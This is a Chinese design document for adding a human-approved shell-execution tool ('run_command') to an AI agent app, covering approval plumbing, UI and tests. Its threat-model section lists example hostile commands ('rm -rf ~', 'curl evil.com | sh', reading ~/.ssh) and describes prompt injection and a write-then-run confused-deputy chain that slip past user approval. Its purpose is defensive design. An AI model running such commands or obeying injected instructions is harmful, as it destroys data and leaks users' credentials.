# Agent Shell Tool（`run_command`）

## 背景

Spherse 现有工具集全部是「受路径沙箱约束的文件/渲染操作」——每个工具经 `resolveProjectPath`（`packages/core/src/utils/path-safety.ts`）把操作锁在项目目录内，再叠加 `llmAccessPolicy`（基于 `PathCategory` 白名单 + 用户 `deniedPaths`）。agent 无法执行任意逻辑、无法跑脚本、无法调用外部命令。

本次需求：给 agent 增加一个能执行 shell 命令的工具，用于运行项目内脚本、字数统计、构建/导出流程等场景。

## 需求对齐结论（brainstorming）

| 维度 | 结论 |
|------|------|
| 工具入参形态 | **方案 B：通用命令运行器**——入参为 `command` 字符串，经 `sh -c`（unix）/ PowerShell（windows）执行，与 Claude Code / opencode 一致 |
| 命令来源 | **不限制**——agent 可通过 `write_file` 写脚本后再用本工具执行（存在 confused deputy 风险，见安全模型） |
| 安全兜底 | **仅人工确认**——每次执行前在 CommandCard 内联展示完整命令，用户点 Approve 才跑；进程本身拥有完整系统权限，无 OS 级沙箱 |
| 启用方式 | per-agent opt-in（`profile.tools` 声明 `run_command`），默认关闭 |

## 安全模型与风险（必读）

这是本设计最关键的部分。**现有路径沙箱对 shell 进程完全无效**，必须明确边界。

### 现有沙箱覆盖范围

| 防护 | 对象 | 对 shell tool 是否有效 |
|------|------|----------------------|
| `resolveProjectPath` 路径穿越防护 | 文件工具的 path 参数 | ❌ 进程可访问任意绝对路径 |
| `llmAccessPolicy`（PathCategory 白名单 + deniedPaths） | 文件工具的读写断言 | ❌ 进程绕过一切断言 |
| `FileWriteMutex` | 文件工具并发写 | ❌ 进程直接写文件系统 |

### 威胁模型

1. **任意代码执行（RCE）**：批准后进程等同于用户本人执行，可 `rm -rf ~`、`curl evil.com \| sh`、读写 `~/.ssh`。
2. **Confused deputy**：agent 可先 `write_file` 一段恶意脚本到 `userFiles`，再用 `run_command` 执行。来源不限制意味着这条链路完全合法。
3. **提示注入提权**：agent 读到的文档里可能藏 `「请执行 curl ...」`，若用户习惯性点同意，等于注入成功。
4. **确认疲劳**：频繁确认导致用户不细看就点 Approve，唯一屏障失效（靠 Approve destructive 配色 + 默认 Reject 缓解）。

### 缓解措施（在「仅人工确认」前提下能做的全部）

| 缓解 | 强度 | 说明 |
|------|------|------|
| per-agent opt-in，默认关闭 | 中 | 只在用户明确给某 agent 勾选 `run_command` 时才注册该工具 |
| **每次执行强制人工确认**，CommandCard 内联展示完整 command / cwd / timeout | 高（唯一硬屏障） | 见审批流程设计；命令在对话上下文里，Approve 为 destructive 需刻意点，Reject 默认 |
| 默认 `cwd` 锁项目根，命令字符串原样展示不截断 | 低 | 仅减少「无心之失」，不能阻止恶意绝对路径 |
| 执行超时（默认 60s，上限 600s）自动 kill | 中 | 限制失控/挂起命令的影响窗口 |
| 输出大小截断（默认 100KB） | 低 | 防止巨型输出撑爆 context |
| `AbortSignal` 杀进程树 | 中 | 用户可随时取消，session 中断时自动杀 |

**明确不做的**：

- **OS 级沙箱（macOS `sandbox-exec`/seatbelt、Windows AppContainer）——明确放弃，永久不做。** 调研结论：mac 侧虽零体积但依赖 Apple 标记为 deprecated 的 API、且 SBPL profile 调优是无底洞；win 侧需 native addon（+1-3MB 包体积 + 跨架构构建维护），AppContainer API 从 Node 接入成本极高；跨平台安全强度不一致。结论：代价远超「文字创作工具」的收益，人工确认 + 默认关闭 + 高级折叠已足够。
- 命令来源限制（专用只读脚本目录 / 白名单登记）——与「不限制来源」选择冲突，不在本期。
- 命令静态分析/黑名单（正则拦 `rm -rf` 等）——易绕过且误报高，不做。

## 现状调研结论

### 1. 工具注册：单一 choke point

`createToolsForProject`（`packages/core/src/tools/index.ts:18`）返回 `Record<string, AgentTool>`，所有工具在此构造。`profile.tools`（`types.ts:18`，`string[]`）按名查表决定 agent 拥有哪些工具（`live-session.ts:299-304`）。新增 `run_command` 只需在 map 加一行。

### 2. agent 事件桥：单向 core→renderer，无 correlation ID

- 通道：chat WS `/ws/projects/:projectId/chat/:agentId/:sessionId`（`packages/server/src/ws-chat.ts:15`），双向但语义割裂。
- server 是「透明传输」：`sendMessage` 的 `onEvent` 回调把 `AgentEvent` 直接 `socket.send`（`ws-chat.ts:51-55`）。
- client→server 现有 3 种消息：`message` / `abort` / `ping`（`contracts/websocket.ts:65-72`）。
- **缺口**：没有任何 correlation ID 把「请求」与「响应」串联。审批往返需要一个通用 `requestId` 机制（见 §3，做成通用 control-request 模式而非 approval 专用）。
- contract 哲学：server 不解释 payload，`tool_execution_*` 的 `args` 用 `Type.Unknown()`（`websocket.ts:13-24`），类型在前端重建。

### 3. 审批闸门接入点

| 候选 | 位置 | 优劣 |
|------|------|------|
| **execute 包装**（采用） | `createToolsForProject` 内对需审批工具包一层 `execute` | ✅ 完全在 Spherse 自有代码；不依赖 `Agent` 构造器是否暴露 loopConfig；`AbortSignal` 已传入 execute；按工具粒度精确控制 |
| `beforeToolCall`（pi-agent-core 原生钩子） | `AgentLoopConfig.beforeToolCall`（`pi-agent-core/dist/types.d.ts:230`） | ⚠️ 需把 loopConfig 接进 `new Agent({...})`（`live-session.ts:343` 当前未传）；钩子是全局的，需按 `toolName` 分支；优势是 `tool_execution_start` 之前触发，状态更干净 |

采用 execute 包装：内聚、风险低。详见方案对比。

### 4. 前端工具渲染：通用面板 + 差异化卡片

- 通用面板 `ToolCallSection.tsx`（不按工具名分发，所有工具自动可用），但**当前不展示 `result` 字段**——只有状态图标。
- 差异化卡片（`render_card`/`generate_image`/文件改动）靠 reducer 内 `if (toolName === ...)` 两处（`chat-session-reducer.ts:220` 流式、`:259` 历史）+ `MessageItem.tsx:75` 分发 + 专用 Card 组件。
- shell 工具必须展示 stdout/stderr/exit code，因此需要新增差异化 `CommandCard`。

### 5. 确认交互形态：内联，不用弹窗

**决定：审批直接内联在 CommandCard 上**，不使用 modal/AlertDialog。理由：(1) 不打断对话焦点、命令在上下文里可读；(2) 一张卡片自然承载完整生命周期 `pending_approval → running → completed/error`，无需独立组件；(3) 状态归属清晰——挂在对应 toolCall 上，而非全局 modal state。现有 `AlertDialog` 受控组件（`components/ui/alert-dialog.tsx`）的「父组件持 target + open 派生」模式不适合「agent 触发→等待用户」的异步流，故不复用。

## 方案对比

### 审批闸门：execute 包装（采用） vs `beforeToolCall`

详见「现状调研结论 §3」。采用 execute 包装：在 `createToolsForProject` 内对 `run_command` 的 `execute` 套一层，先 `await ctx.approvalGate.request(...)` 再委托原 execute。审批拒绝时直接返回错误 result（不抛异常，与现有 read_file 被拒的处理一致）。

### 审批 correlation：chat WS 内复用 vs 独立控制 WS

| 方案 | 说明 | 结论 |
|------|------|------|
| **chat WS 内复用**（采用） | 在现有 client 消息联合加 `resolve_control_request`，在 server 事件联合加 `control_request`/`control_resolved`（带 `kind`）。chat WS 已是 session 级、双向、与该 session 生命周期绑定 | ✅ 零新通道，与 bus WS 的 correlated 模式（`contracts/bus.ts`）同构 |
| 独立控制 WS | 新开 `/ws/.../control` 专走审批 | ❌ 过度设计，session 已有唯一 chat WS |

## 详细设计

### 1. `run_command` 工具（`packages/core/src/tools/run-command.ts`）

```ts
const RunCommandParams = Type.Object({
  command: Type.String({
    description: "The shell command to execute. Run via sh -c (unix) / PowerShell (windows). On Windows, generate PowerShell syntax ($env:VAR, | object pipeline, cmdlets).",
  }),
  cwd: Type.Optional(Type.String({
    description: "Working directory relative to project root. Defaults to project root.",
  })),
  timeout_ms: Type.Optional(Type.Number({
    description: "Max execution time in ms. Default 60000, max 600000 (10min).",
  })),
});
```

**execute 流程：**

1. 解析 `cwd`：`resolveProjectPath(root, cwd ?? ".")` —— 把工作目录锁在项目内（注意：仅锁 cwd，不锁进程后续访问）。
2. `timeout`：`Math.min(Math.max(params.timeout_ms ?? 60000, 1000), 600000)`。
3. spawn：
   - unix：`spawn("/bin/sh", ["-c", command], { cwd, env: process.env, detached: true })`
   - windows：`spawn(pwsh, ["-NoProfile", "-NonInteractive", "-Command", command], { cwd, env: process.env })`，其中 `pwsh` 由 `resolveWindowsShell()` 探测决定——**回退链 `pwsh.exe` → `powershell.exe`**（见下）。`-NoProfile` 跳过用户 profile 加载（避免污染/副作用），`-NonInteractive` 防止命令挂起等交互输入。
   - `detached: true`（unix）启用新进程组，便于 `process.kill(-pid)` 杀整树。
   - **Windows Shell 选择（PowerShell 回退链）**：`resolveWindowsShell()` 按序探测——优先 `pwsh.exe`（PowerShell 7+，跨平台现代版），不存在则回退 `powershell.exe`（Windows PowerShell 5.1，**系统始终预装**）。**不支持 `cmd.exe`**——用户明确选择 PowerShell 语义。两者语法大体兼容（少数差异：`&&`/`||` 链式操作符仅 7+ 支持），agent 生成的命令应避免 7+ 独有语法以保证回退兼容；tool `description` 会标注当前平台用 PowerShell。探测结果缓存到进程级（同一 session 内一致）。
4. 输出捕获：分别累积 stdout/stderr，**每收到 chunk 调一次 `onUpdate`**（流式推送，前端实时显示）。累计超过 `MAX_OUTPUT`（100KB）后停止累积，追加 `\n[output truncated]` 标记并继续丢弃（不阻塞进程）。
5. 完成：`{ exitCode, stdout, stderr, durationMs, timedOut }` 进 `details`；`content` 为结构化文本：
   ```
   Command: <command>
   Exit code: <n>
   --- stdout ---
   <stdout>
   --- stderr ---
   <stderr>
   ```
6. 超时/abort：`clearTimeout`；unix `process.kill(-child.pid, "SIGTERM")`，Windows 用 `taskkill /pid /T /F`；`timedOut`/`aborted` 标记进 details，content 反映部分输出。
7. `onUpdate` 推送的 partialResult.details 形如 `{ stdout, stderr, running: true }`，完成时 finalize。

### 2. 审批闸门（`packages/core/src/tools/with-approval.ts`）

**新增接口：**

```ts
export interface ApprovalRequest {
  requestId: string;   // 通用 correlation key，由调用方生成（crypto.randomUUID()）
  toolCallId: string;
  toolName: string;
  args: unknown;
}

export interface ApprovalDecision {
  approved: boolean;
  reason?: string;
}

export interface ApprovalGate {
  request(req: ApprovalRequest): Promise<ApprovalDecision>;
}
```

**`withApproval` 包装器**（`tools/with-approval.ts`）：

```ts
export function withApproval<T extends AgentTool>(
  tool: T,
  gate: ApprovalGate,
): T {
  const original = tool.execute;
  return {
    ...tool,
    async execute(toolCallId, params, signal, onUpdate) {
      const decision = await gate.request({
        requestId: crypto.randomUUID(),
        toolCallId,
        toolName: tool.name,
        args: params,
      });
      if (!decision.approved) {
        return {
          content: [{ type: "text", text: `Execution rejected by user${decision.reason ? `: ${decision.reason}` : ""}.` }],
          details: { rejected: true, reason: decision.reason },
        };
      }
      return original(toolCallId, params, signal, onUpdate);
    },
  };
}
```

**`createToolsForProject` 改动**（`tools/index.ts`）：`run_command` 经 `withApproval` 包装后注册：

```ts
run_command: withApproval(createRunCommandTool(ctx.root), ctx.approvalGate),
```

`ToolContext` 新增 `approvalGate?: ApprovalGate`（可选；不传时 `withApproval` 透传，便于测试）。`run_command` 是唯一默认带审批的工具；未来其它高危工具可复用。

### 3. Control Request 机制（通用 correlation，approval 为首个 kind）

审批往返的本质是「session 执行中途，core 向 renderer 发起一次请求并等待响应」。这是 chat WS 当前唯一缺失的能力——现有通道是「单向推事件 + fire-and-forget 回传」，没有把请求与响应关联起来的 key。

**设计取舍**：不建一套完整的通用 control-request 框架（envelope + 动态分发 + 多消费者注册）——那是 YAGNI，当前只有 approval 一个消费者。但**把 correlation key 做成通用的**：用 `requestId` 命名（而非领域化的 `approvalId`），pending 表做成带 `kind` 判别的通用结构。这样未来加 steering 确认、动态参数询问、「向用户提问」等控制请求时，只加新 `kind`，不动管线与传输层。额外成本 < 0.5 天，收益是明确的扩展点。

**`SessionControlBus`**（独立类，`packages/core/src/session/control-bus.ts`）——管理 session 级所有 pending 控制请求，approval 是其首个 kind：

```ts
export type ControlRequestKind = "approval";   // 未来: | "steering" | "param_prompt" | ...

interface PendingRequest<TDecision> {
  kind: ControlRequestKind;
  resolve: (d: TDecision) => void;
  reject: (e: Error) => void;
  timer: NodeJS.Timeout;
}

export class SessionControlBus {
  private readonly pending = new Map<string, PendingRequest<unknown>>();
  private eventSink: ((e: SessionControlEvent) => void) | null = null;

  setEventSink(sink: ((e: SessionControlEvent) => void) | null): void { this.eventSink = sink; }

  // 泛型请求：返回该 kind 对应的决策类型；requestId 由调用方生成（crypto.randomUUID()）
  request<T>(req: ControlRequest, timeoutMs: number): Promise<T> { /* 存 pending、设 timer、经 eventSink 发出 */ }

  resolve<T>(requestId: string, decision: T): void { /* 查表、校验 kind 匹配、clearTimeout、resolve、发 resolved 事件 */ }
  rejectAll(reason: string): void { /* abort 时全部 reject */ }
}
```

**`ApprovalGate`** 退化为 `SessionControlBus` 上的一层薄适配（实现 `ApprovalGate.request` → `bus.request({ kind: "approval", requestId, toolCallId, toolName, args }, APPROVAL_TIMEOUT_MS)`），保留 `ToolContext.approvalGate` 接口不变，工具层无感知 bus 存在。

- `APPROVAL_TIMEOUT_MS = 5 * 60 * 1000`（审批等待超时，与 run_command 的 `timeout_ms` 执行超时是两个独立概念）。
- **LiveSession 接线**：持有一个 `SessionControlBus` 实例；`create`/`restore` **先建 bus**，再经 `ApprovalGate` 适配器传入 `buildAgent` → `ToolContext.approvalGate`（消除「gate 引用未构造完的 LiveSession」问题）；`sendMessage` 进入前 `bus.setEventSink(onEvent)`、结束后 `setEventSink(null)`；`abort()` 调 `bus.rejectAll("session aborted")`。
- **`resolveControlRequest`**：LiveSession 暴露 `resolveControlRequest(requestId, decision)` → `this.bus.resolve(...)`，供 SessionManager/server 调用（通用入口，不限于 approval）。

**事件类型扩展**——新增 session 级控制事件（非 pi-agent-core 的 AgentEvent），`requestId` 为通用关联键：

```ts
export type SessionControlEvent =
  | { type: "control_request"; requestId: string; kind: "approval"; toolCallId: string; toolName: string; args: unknown }
  | { type: "control_resolved"; requestId: string; kind: "approval"; approved: boolean; reason?: string };
```

> 采用 `control_request` / `control_resolved` + `kind` 判别的事件骨架，而非 `approval_requested` / `approval_resolved`。`kind` 当前只有 `"approval"`，新增 kind 只在联合里加 variant，传输层与 server 桥接零改动。

`LiveSession.sendMessage` 的 `onEvent` 类型扩展为 `(AgentEvent | SessionControlEvent) => void`。发出 `control_request`（请求时）与 `control_resolved`（resolve 后补发，便于前端清理状态）。

**buildAgent 接线**：`ToolContext` 构造（`live-session.ts:292`）传入 `approvalGate`（`ApprovalGate` 适配器，由 `create`/`restore` 在调 `buildAgent` 前基于 bus 创建）。

**SessionManager**（`session-manager.ts`）：新增 `resolveControlRequest(sessionId, requestId, decision)` → `this.sessions.get(sessionId)?.resolveControlRequest(...)`。

### 4. Contract 扩展（`packages/server/src/contracts/websocket.ts`）

**ChatServerEvent 联合新增**（遵循透明传输，args 用 `Type.Unknown()`）：

```ts
Type.Object({
  type: Type.Literal("control_request"),
  requestId: Type.String(),
  kind: Type.Literal("approval"),
  toolCallId: Type.String(),
  toolName: Type.String(),
  args: Type.Unknown(),
}),
Type.Object({
  type: Type.Literal("control_resolved"),
  requestId: Type.String(),
  kind: Type.Literal("approval"),
  approved: Type.Boolean(),
  reason: Type.Optional(Type.String()),
}),
```

**ChatClientMessage 联合新增：**

```ts
Type.Object({
  type: Type.Literal("resolve_control_request"),
  requestId: Type.String(),
  kind: Type.Literal("approval"),
  approved: Type.Boolean(),
  reason: Type.Optional(Type.String()),
}),
```

### 5. Server 桥接（`packages/server/src/ws-chat.ts`）

在 client 消息 switch（`ws-chat.ts:64` 附近）加分支：

```ts
} else if (msg.type === "resolve_control_request") {
  ctx.sessionRuntime.resolveControlRequest(sessionId, msg.requestId, { approved: msg.approved, reason: msg.reason });
}
```

server 对 `control_request`/`control_resolved` 不做特判，仍由现有 `onEvent` → `parseChatServerEvent` → `socket.send` 透传。`kind` 字段透传不解释，符合「transparent transport」哲学。

### 6. Renderer 改动

**(a) 事件解析**（`agent-event-parse.ts:15`）：`AgentEvent` 联合加 `control_request`/`control_resolved` 两个 case，`parseAgentEvent`（`:119`）加对应分支。

**(b) streaming-store**（`streaming-store.ts`）：
- 审批状态**挂在对应 toolCall 上**（不是全局 modal state）：`reduceSessionEvents` 处理 `control_request` → 找到 `toolCallId` 对应的 toolCall，置 `status: "pending_approval"` 并存 `{ requestId, command, cwd, timeoutMs }`（从 args 提取展示字段）；`control_resolved` → 清 `pending_approval` 态，status 回落到 `running`（approved）或标记 `rejected`（!approved，后续 `tool_execution_end` 会定终态）。
- 新增 action `respondApproval(requestId, approved)` → `ws.send({ type: "resolve_control_request", requestId, kind: "approval", approved })`。

**CommandCard：单组件承载审批 + 结果全生命周期**（新建 `features/chat/CommandCard.tsx`，参考 `ImageCard.tsx`）。状态机：

| toolCall 状态 | 卡片渲染 |
|---|---|
| `pending_approval` | 展示 command（等宽、不截断、可滚动）、cwd、timeout；底部 **Reject**（默认/primary）+ **Approve**（destructive 变体，需刻意点）。点 Reject → `respondApproval(requestId, false)`；点 Approve → `respondApproval(requestId, true)`。**无主动关闭路径**——不点就一直挂到审批超时（5min）自动 Reject |
| `running` | spinner + 流式 stdout（`tool_execution_update` 实时追加） |
| `completed` | 完整 stdout/stderr（终端配色）、exit code badge、duration |
| `error` | 同 completed 但 exit≠0 或 `[timed out]` / `[rejected]` 标记 |

- **安全设计**：Approve 用 destructive 配色（红）需刻意点击；Reject 为默认焦点；`pending_approval` 不提供「关掉/忽略」按钮（避免误关=默认放行），只能显式二选一或等超时。
- **接入点**（差异化卡片 dispatch，4 处）：`types.ts` ChatCard 联合加 `command` variant；reducer `extractCardDetailsFromPartial`（`:220`）处理流式；reducer `buildCardFromToolResult`（`:259`）处理历史恢复；`MessageItem.tsx:75` 加 `command` → `<CommandCard />` 分支。
- 审批状态字段（`requestId`/`command`/`cwd`/`timeoutMs`/`approvalState`）挂在 `ToolCallInfo` 上，reducer 在 `control_request` 时写入；历史消息里 `pending_approval` 不复现（持久化时按 `rejected`/终态存）。

### 7. 配置 / 启用 / i18n

- **工具注册**：`createToolsForProject` 加 `run_command`（见 §2）。
- **前端勾选**：`features/agent-dialog/tool-registry.ts` 的 `TOOL_GROUPS` 新增一组：
  ```ts
  { label: "tool.run_command", hint: "tool.run_command_hint", toolIds: ["run_command"] }
  ```
  hint 文案需强调「执行任意命令，需逐次人工确认，有安全风险」。
- **作为高级功能折叠**：`run_command` 不与常规工具并列展示，而是放在 agent 配置 tool 权限区下的「高级 / 危险操作」折叠分组（Disclosure/Collapsible，默认收起），需用户主动展开才能勾选。`TOOL_GROUPS` 需支持分组级别「advanced」标记，`ToolPicker`（`features/agent-dialog/ToolPicker.tsx`）据此把该组渲染为可折叠区块 + 警告色标题。这是降低误启用概率的 UI 层防线，与「默认 profile 不含 run_command」双保险。
- **i18n**（`zh-CN.ts` 基准 + zh-TW/en）：`tool.run_command`、`tool.run_command_hint`、`tool.advanced_section`（高级折叠区标题）、CommandCard 审批/状态文案（`command.approve`/`command.reject`/`command.pending`/`command.rejected`/`command.timedOut`/`command.exitCode` 等）、平台 shell 说明。
- 默认所有 agent profile 不含 `run_command`，必须用户显式展开高级区并勾选。

## 时序与边界行为

| 场景 | 行为 |
|------|------|
| 正常执行（批准） | agent 调 run_command → execute wrapper 经 bus 发 `control_request`(kind=approval) → CommandCard 转 `pending_approval` 显示 Approve/Reject → 用户 Approve → core resolve(approved) → 委托原 execute → spawn → 流式 onUpdate → `tool_execution_end`(completed) |
| 用户拒绝 | resolve(approved=false) → wrapper 返回 rejected result → agent 收到「rejected by user」文本 → `tool_execution_end`(completed, content=拒绝说明)，卡片标 rejected |
| 用户不点（忽略卡片） | approval 超时定时器（5min）触发 → 自动 resolve(approved=false, reason=timeout) → 同拒绝路径，content 标 timeout |
| session 中断/abort | `LiveSession.abort()` → `bus.rejectAll()` reject 全部 pending → 进程若已 spawn 由其 execute 的 signal kill；未 spawn 则直接拒绝 |
| 命令执行中超时 | execute 内 timeout kill 进程树 → `tool_execution_end`(completed, timedOut=true, 部分输出) |
| 命令执行中用户取消 | `AbortSignal` 触发 → kill 进程树 → partial result 标 aborted |
| WS 断线重连期间有 pending approval | 旧 approval 仍在 core bus pending；重连后前端 state 重置无 pending → 用户无法回应 → 走超时拒绝路径（可接受；未来可做重连后重放 pending） |
| 并发多个 run_command | 各自独立 `requestId`，互不影响；多张 CommandCard 各自处于自己的 pending/running 状态 |

## 测试计划

| 文件 | 覆盖 |
|------|------|
| `__tests__/tools/run-command.test.ts` | spawn 成功（exitCode/stdout/stderr）、超时 kill、abort kill、输出截断、cwd 越界拒绝、跨平台 shell 选择（mock spawn） |
| `__tests__/tools/with-approval.test.ts` | 批准→委托原 execute；拒绝→返回 rejected result；gate 缺省时透传 |
| `__tests__/session/control-bus.test.ts` | request→resolve 路径、超时自动 resolve(approved=false)、abort 全部 reject、未知 id resolve 忽略、kind 判别、并发互不串扰 |
| `__tests__/contracts/websocket.test.ts`（或现有 contract 测试） | `control_request`/`control_resolved`/`resolve_control_request` schema 校验（含 `kind`） |
| server 现有 WS 测试 | `resolve_control_request` client 消息路由到 `sessionRuntime.resolveControlRequest` |

`live-session.test.ts` 保持不接真实 gate（与现有 MCP 处理一致），approval 接线在 gate 单测层覆盖。

## 文档同步

- `docs/official/` 工具/架构文档：新增 `run_command` 工具说明 + 审批流程 + 安全模型说明
- `docs/dev/backlog.md`：新增条目并标记状态
- `AGENTS.md`：如有「工具列表」段落需补充；安全规范段落补充 shell tool 的路径沙箱例外说明

## 改动清单

**packages/core**
1. `src/tools/run-command.ts`（新）—— `createRunCommandTool`
2. `src/tools/with-approval.ts`（新）—— `withApproval` 包装器 + `ApprovalGate`/`ApprovalRequest`/`ApprovalDecision` 类型
3. `src/tools/tool-context.ts` —— 加 `approvalGate?: ApprovalGate`
4. `src/tools/index.ts` —— 注册 `run_command`（经 `withApproval`）
5. `src/session/control-bus.ts`（新）—— `SessionControlBus` + `ControlRequest`/`ControlRequestKind` 类型
6. `src/session/approval-gate.ts`（新）—— `ApprovalGate` 的薄适配器（`ApprovalGate.request` → `bus.request(kind:"approval")`）
7. `src/session/live-session.ts` —— 持有 bus；`create`/`restore` 先建 bus→适配 gate 传 buildAgent；`sendMessage` 接线 eventSink；`abort` 调 `rejectAll`；暴露 `resolveControlRequest`
8. `src/session/session-manager.ts` —— `resolveControlRequest(sessionId, requestId, decision)`
9. `src/session/types.ts` —— `SessionControlEvent` 类型（`control_request`/`control_resolved` + `kind`）
10. `__tests__/` —— run-command / with-approval / control-bus 测试

**packages/server**
11. `src/contracts/websocket.ts` —— `control_request`/`control_resolved`/`resolve_control_request` schema（带 `kind`）
12. `src/ws-chat.ts` —— `resolve_control_request` 路由

**packages/app**
13. `src/features/chat/agent-event-parse.ts` —— 两个新事件 case
14. `src/features/chat/streaming-store.ts` —— reducer 处理 `control_request`/`control_resolved`（挂 toolCall 状态）+ `respondApproval` action
15. `src/features/chat/CommandCard.tsx`（新）—— 审批+结果全生命周期卡片 + `types.ts`/`chat-session-reducer.ts`/`MessageItem.tsx` dispatch 接入
16. `src/features/agent-dialog/tool-registry.ts` —— run_command 工具组 + 分组级 `advanced` 标记；`ToolPicker.tsx` 支持高级折叠区块渲染

**packages/i18n**
17. `zh-CN.ts`/`zh-TW.ts`/`en.ts` —— 工具名/hint/高级区标题/CommandCard(approve/reject/状态) 文案

**docs**
18. `docs/official/` + `docs/dev/backlog.md` + `AGENTS.md`（按需）

## 工作量估算

| 模块 | 量级 |
|------|------|
| run_command tool + 单测 | 1.5 天 |
| 审批闸门（gate + with-approval + LiveSession 接线 + SessionManager）+ 单测 | 2 天 |
| server contract + ws-chat 路由 + contract 测试 | 0.5 天 |
| renderer（事件解析 + streaming-store + CommandCard 含内联审批） | 2.5 天 |
| 配置 / tool-registry / i18n 三语 | 1 天 |
| 文档同步 + backlog | 0.5 天 |
| **合计** | **约 8 天**（方案 B，含跨平台 shell 处理） |

最大风险仍是**审批往返管线**（§3）：core/server/renderer 三层双向异步，超时、abort、断线、并发均需处理干净。建议实现时先打通「tool wrapper → 假 gate（auto-approve）→ spawn → 流式输出」最小闭环，再接真实审批往返。

## 未来 backlog（不在本期）

- **可配置 shell**：`run_command` 增加 `shell` 参数或项目级设置，允许用户在 unix 上指定 `bash`/`zsh`/`pwsh`、或显式锁定 Windows 用某个 PowerShell 版本，覆盖默认探测
- 命令来源限制（专用只读脚本目录 / 白名单登记）
- 审批「记住决策」（per-command-hash 免再次确认）
- 重连后重放 pending control request
- 输出交互式终端（pty，支持交互式命令）
- 更多 control-request kind（steering 确认、动态参数询问、「向用户提问」工具），复用 §3 的 `requestId`/`SessionControlBus` 管线

> OS 级沙箱已明确永久放弃，理由见「安全模型与风险」章节。
